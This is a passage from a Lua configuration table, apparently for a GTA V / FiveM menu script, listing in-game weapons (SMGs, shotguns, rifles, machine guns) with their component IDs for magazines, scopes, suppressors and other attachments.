                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    },
                    {
                        name = '~h~~p~» ~w~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~p~» ~w~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~p~» ~w~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~p~» ~w~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~p~» ~w~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~p~» ~w~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~p~» ~w~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                }
            }
        },
        AssaultSMG = {
            id = 'weapon_assaultsmg',
            name = '~h~~p~» ~w~Assault SMG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_ASSAULTSMG_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_ASSAULTSMG_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                }
            }
        },
        CombatPDW = {
            id = 'weapon_combatpdw',
            name = '~h~~p~» ~w~Combat PDW',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_COMBATPDW_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_COMBATPDW_CLIP_02'
                    },
                    {
                        name = '~h~~p~» ~w~Drum Magazine',
                        id = 'COMPONENT_COMBATPDW_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        MachinePistol = {
            id = 'weapon_machinepistol',
            name = '~h~~p~» ~w~Machine Pistol ',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_MACHINEPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_MACHINEPISTOL_CLIP_02'
                    },
                    {
                        name = '~h~~p~» ~w~Drum Magazine',
                        id = 'COMPONENT_MACHINEPISTOL_CLIP_03'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        MiniSMG = {
            id = 'weapon_minismg',
            name = '~h~~p~» ~w~Mini SMG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_MINISMG_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_MINISMG_CLIP_02'
                    }
                }
            }
        },
        UnholyHellbringer = {
            id = 'weapon_raycarbine',
            name = '~h~~p~» ~w~Unholy Hellbringer',
            bInfAmmo = false,
            mods = {}
        }
    },
    Shotguns = {
        PumpShotgun = {
            id = 'weapon_pumpshotgun',
            name = '~h~~p~» ~w~Pump Shotgun',
            bInfAmmo = false,
            mods = {
                Flashlight = {
                    {
                        'name = Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_SR_SUPP'
                    }
                }
            }
        },
        PumpShotgunMkII = {
            id = 'weapon_pumpshotgun_mk2',
            name = '~h~~p~» ~w~Pump Shotgun Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Shells',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Dragon Breath Shells',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~p~» ~w~Steel Buckshot Shells',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~p~» ~w~Flechette Shells',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~p~» ~w~Explosive Slugs',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~» ~w~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~p~» ~w~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    },
                    {
                        name = '~h~~p~» ~w~Medium Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_SR_SUPP_03'
                    },
                    {
                        name = '~h~~p~» ~w~Squared Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_08'
                    }
                }
            }
        },
        SawedOffShotgun = {
            id = 'weapon_sawnoffshotgun',
            name = '~h~~p~» ~w~Sawed-Off Shotgun',
            bInfAmmo = false,
            mods = {}
        },
        AssaultShotgun = {
            id = 'weapon_assaultshotgun',
            name = '~h~~p~» ~w~Assault Shotgun',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_ASSAULTSHOTGUN_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_ASSAULTSHOTGUN_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        BullpupShotgun = {
            id = 'weapon_bullpupshotgun',
            name = '~h~~p~» ~w~Bullpup Shotgun',
            bInfAmmo = false,
            mods = {
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        Musket = {
            id = 'weapon_musket',
            name = '~h~~p~» ~w~Musket',
            bInfAmmo = false,
            mods = {}
        },
        HeavyShotgun = {
            id = 'weapon_heavyshotgun',
            name = '~h~~p~» ~w~Heavy Shotgun',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_HEAVYSHOTGUN_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_HEAVYSHOTGUN_CLIP_02'
                    },
                    {
                        name = '~h~~p~» ~w~Drum Magazine',
                        id = 'COMPONENT_HEAVYSHOTGUN_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        DoubleBarrelShotgun = {
            id = 'weapon_dbshotgun',
            name = '~h~~p~» ~w~Double Barrel Shotgun',
            bInfAmmo = false,
            mods = {}
        },
        SweeperShotgun = {
            id = 'weapon_autoshotgun',
            name = '~h~~p~» ~w~Sweeper Shotgun',
            bInfAmmo = false,
            mods = {}
        }
    },
    AssaultRifles = {
        AssaultRifle = {
            id = 'weapon_assaultrifle',
            name = '~h~~p~» ~w~Assault Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_CLIP_02'
                    },
                    {
                        name = '~h~~p~» ~w~Drum Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        AssaultRifleMkII = {
            id = 'weapon_assaultrifle_mk2',
            name = '~h~~p~» ~w~Assault Rifle Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~p~» ~w~Tracer Rounds',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~p~» ~w~Incendiary Rounds',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~p~» ~w~Hollow Point Rounds',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~p~» ~w~FMJ Rounds',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~» ~w~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~p~» ~w~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    },
                    {
                        name = '~h~~p~» ~w~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~p~» ~w~Default',
                        id = 'COMPONENT_AT_AR_BARREL_01'
                    },
                    {
                        name = '~h~~p~» ~w~Heavy',
                        id = 'COMPONENT_AT_AR_BARREL_0'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    },
                    {
                        name = '~h~~p~» ~w~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~p~» ~w~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~p~» ~w~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~p~» ~w~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~p~» ~w~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~p~» ~w~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~p~» ~w~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP_02'
                    }
                }
            }
        },
        CarbineRifle = {
            id = 'weapon_carbinerifle',
            name = '~h~~p~» ~w~Carbine Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_CARBINERIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_CARBINERIFLE_CLIP_02'
                    },
                    {
                        name = '~h~~p~» ~w~Box Magazine',
                        id = 'COMPONENT_CARBINERIFLE_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        CarbineRifleMkII = {
            id = 'weapon_carbinerifle_mk2',
            name = '~h~~p~» ~w~Carbine Rifle Mk II ',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~p~» ~w~Tracer Rounds',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~p~» ~w~Incendiary Rounds',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~p~» ~w~Hollow Point Rounds',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~p~» ~w~FMJ Rounds',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~» ~w~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~p~» ~w~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    },
                    {
                        name = '~h~~p~» ~w~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~p~» ~w~Default',
                        id = 'COMPONENT_AT_CR_BARREL_01'
                    },
                    {
                        name = '~h~~p~» ~w~Heavy',
                        id = 'COMPONENT_AT_CR_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    },
                    {
                        name = '~h~~p~» ~w~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~p~» ~w~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~p~» ~w~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~p~» ~w~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~p~» ~w~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~p~» ~w~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~p~» ~w~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP_02'
                    }
                }
            }
        },
        AdvancedRifle = {
            id = 'weapon_advancedrifle',
            name = '~h~~p~» ~w~Advanced Rifle ',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_ADVANCEDRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_ADVANCEDRIFLE_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                }
            }
        },
        SpecialCarbine = {
            id = 'weapon_specialcarbine',
            name = '~h~~p~» ~w~Special Carbine',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_CLIP_02'
                    },
                    {
                        name = '~h~~p~» ~w~Drum Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        SpecialCarbineMkII = {
            id = 'weapon_specialcarbine_mk2',
            name = '~h~~p~» ~w~Special Carbine Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~p~» ~w~Tracer Rounds',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~p~» ~w~Incendiary Rounds',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~p~» ~w~Hollow Point Rounds',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~p~» ~w~FMJ Rounds',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~» ~w~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~p~» ~w~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    },
                    {
                        name = '~h~~p~» ~w~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~p~» ~w~Default',
                        id = 'COMPONENT_AT_SC_BARREL_01'
                    },
                    {
                        name = '~h~~p~» ~w~Heavy',
                        id = 'COMPONENT_AT_SC_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    },
                    {
                        name = '~h~~p~» ~w~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~p~» ~w~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~p~» ~w~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~p~» ~w~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~p~» ~w~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~p~» ~w~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~p~» ~w~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP_02'
                    }
                }
            }
        },
        BullpupRifle = {
            id = 'weapon_bullpuprifle',
            name = '~h~~p~» ~w~Bullpup Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_BULLPUPRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_BULLPUPRIFLE_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        BullpupRifleMkII = {
            id = 'weapon_bullpuprifle_mk2',
            name = '~h~~p~» ~w~Bullpup Rifle Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~p~» ~w~Tracer Rounds',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~p~» ~w~Incendiary Rounds',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~p~» ~w~Armor Piercing Rounds',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~p~» ~w~FMJ Rounds',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~» ~w~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~p~» ~w~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_02_MK2'
                    },
                    {
                        name = '~h~~p~» ~w~Medium Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~p~» ~w~Default',
                        id = 'COMPONENT_AT_BP_BARREL_01'
                    },
                    {
                        name = '~h~~p~» ~w~Heavy',
                        id = 'COMPONENT_AT_BP_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    },
                    {
                        name = '~h~~p~» ~w~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~p~» ~w~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~p~» ~w~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~p~» ~w~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~p~» ~w~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~p~» ~w~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~p~» ~w~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        CompactRifle = {
            id = 'weapon_compactrifle',
            name = '~h~~p~» ~w~Compact Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_COMPACTRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_COMPACTRIFLE_CLIP_02'
                    },
                    {
                        name = '~h~~p~» ~w~Drum Magazine',
                        id = 'COMPONENT_COMPACTRIFLE_CLIP_03'
                    }
                }
            }
        }
    },
    LMG = {
        MG = {
            id = 'weapon_mg',
            name = '~h~~p~» ~w~MG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_MG_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_MG_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_02'
                    }
                }
            }
        },
        CombatMG = {
            id = 'weapon_combatmg',
            name = '~h~~p~» ~w~Combat MG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_COMBATMG_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_COMBATMG_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        CombatMGMkII = {
            id = 'weapon_combatmg_mk2',
            name = '~h~~p~» ~w~Combat MG Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~p~» ~w~Tracer Rounds',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~p~» ~w~Incendiary Rounds',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~p~» ~w~Hollow Point Rounds',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~p~» ~w~FMJ Rounds',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~» ~w~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~p~» ~w~Medium Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_MK2'
                    },
                    {
                        name = '~h~~p~» ~w~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~p~» ~w~Default',
